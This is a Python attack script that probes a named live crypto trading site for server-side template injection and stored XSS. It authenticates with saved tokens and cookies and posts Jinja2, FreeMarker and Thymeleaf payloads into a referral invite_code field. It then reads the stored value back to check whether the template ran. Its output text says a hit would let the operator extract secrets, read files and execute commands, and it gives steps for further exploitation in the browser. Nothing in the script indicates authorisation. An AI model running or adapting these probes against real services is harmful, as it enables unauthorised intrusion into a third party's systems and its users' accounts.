#!/usr/bin/env python3
"""
SSTI Reflection Test
Goal: Store payload in gmgn.ai, then find where it displays back
"""
import json
import requests
import time

with open("tokens.json") as f:
    tokens = json.load(f)

with open("cookies.json") as f:
    cookies = json.load(f)

ACCESS_TOKEN = tokens["access_token"]

HEADERS = {
    "Authorization": f"Bearer {ACCESS_TOKEN}",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
    "Origin": "https://gmgn.ai",
    "Referer": "https://gmgn.ai/",
}

PARAMS = {
    "device_id": "acf898c7-5063-4d0f-b992-d1e5d568409e",
    "fp_did": "5154d56b50e3061629dca8bf8538b346",
    "client_id": "gmgn_web_20260712-1986-3641f8b",
    "from_app": "gmgn",
    "app_ver": "20260712-1986-3641f8b",
    "tz_name": "Asia/Aden",
    "tz_offset": "10800",
    "app_lang": "en-US",
    "os": "web",
    "worker": "0"
}

print("="*80)
print("🦊 SSTI REFLECTION TEST")
print("="*80)
print("\nStrategy: The bind_invite endpoint stores data persistently.")
print("Let's inject template payload there and see where it shows up!\n")

# Use YOUR wallet address so we can see the payload reflected
YOUR_WALLET = "0x2cdfaa98cca67d5139ba399b03c5425380f38fd7"  # Your bot wallet from earlier

# CRITICAL: We need to use bind_invite because it STORES data
# Then we retrieve it with invite_info

print("[STEP 1] Inject SSTI payload via bind_invite")
print("-" * 60)

# Test different template syntaxes
test_payloads = [
    ("Jinja2", "XSSTEST{{7*7}}"),
    ("Jinja2_config", "XSSTEST{{config}}"),
    ("FreeMarker", "XSSTEST${7*7}"),
    ("Thymeleaf", "XSSTEST[(${7*7})]"),
]

for name, payload in test_payloads:
    print(f"\n   Testing {name}: {payload}")
    
    try:
        # Inject via bind_invite
        r = requests.post(
            "https://gmgn.ai/tapi/v1/fourmeme/bind_invite",
            params=PARAMS,
            headers=HEADERS,
            cookies=cookies,
            json={
                "chain": "bsc",
                "from_address": YOUR_WALLET,
                "invite_code": payload
            },
            timeout=10
        )
        
        print(f"   Status: {r.status_code}", end="")
        
        if r.status_code == 200:
            d = r.json()
            code = d.get("code")
            print(f" | Code: {code}", end="")
            
            if code == 0:
                print(f" | ✅ STORED!")
                
                # Wait a sec for server to process
                time.sleep(1)
                
                # Now retrieve it
                print(f"   Retrieving via invite_info...")
                r2 = requests.post(
                    "https://gmgn.ai/tapi/v1/fourmeme/invite_info",
                    params=PARAMS,
                    headers=HEADERS,
                    cookies=cookies,
                    json={
                        "chain": "bsc",
                        "from_address": YOUR_WALLET
                    },
                    timeout=10
                )
                
                if r2.status_code == 200:
                    d2 = r2.json()
                    response_str = json.dumps(d2)
                    
                    print(f"   Response: {response_str[:200]}")
                    
                    # Check for template execution
                    if "49" in response_str or "XSSTEST49" in response_str:
                        print(f"\n   💀💀💀 TEMPLATE EXECUTED! Found 49!")
                        print(f"   Full response:\n{json.dumps(d2, indent=2)}")
                        break
                    elif payload in response_str:
                        print(f"   ⚠️  Payload reflected as-is: {payload}")
                        print(f"   Full response:\n{json.dumps(d2, indent=2)[:500]}")
                    else:
                        print(f"   ❌ Payload not in response")
                        
            elif code == 40101600:
                print(f" | ⚠️ Trading auth required")
                break
            else:
                print(f" | ❌ Rejected: {d.get('message')}")
                
        elif r.status_code == 403:
            print(f" | ❌ WAF blocked")
        elif r.status_code == 500:
            print(f" | ⚠️ Server error")
            
    except Exception as e:
        print(f" | Error: {str(e)[:40]}")
    
    time.sleep(0.5)

print("\n" + "="*80)
print("🎯 ANALYSIS")
print("="*80)

print("""
If payload was reflected but NOT executed:
→ This is Stored XSS (not SSTI)
→ Still exploitable! Need to find where gmgn displays it in HTML

If payload executed (found 49):
→ Full SSTI confirmed!
→ Can extract secrets, read files, execute commands

If payload blocked:
→ Need to test in browser with your real session
→ Python requests may be getting different validation
""")

print("\n🦊 NEXT: Check gmgn.ai/rewards page in browser")
print("Look at your referral info - does the injected code appear there?")
print("Open browser DevTools and check the HTML source for your payload!")

print("\n" + "="*80)
